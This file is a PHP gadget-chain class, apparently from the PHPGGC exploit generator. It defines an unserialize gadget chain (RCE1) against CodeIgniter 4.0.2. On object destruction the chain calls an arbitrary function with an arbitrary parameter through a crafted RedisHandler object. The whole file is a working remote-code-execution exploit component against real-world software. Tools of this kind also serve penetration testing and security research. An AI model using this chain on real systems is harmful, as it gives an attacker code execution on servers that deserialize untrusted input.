<?php

namespace GadgetChain\CodeIgniter4;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.0.2';
    public static $vector = '__destruct';
    public static $author = 'eboda';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \CodeIgniter\Cache\Handlers\RedisHandler($function, $parameter);
    }
}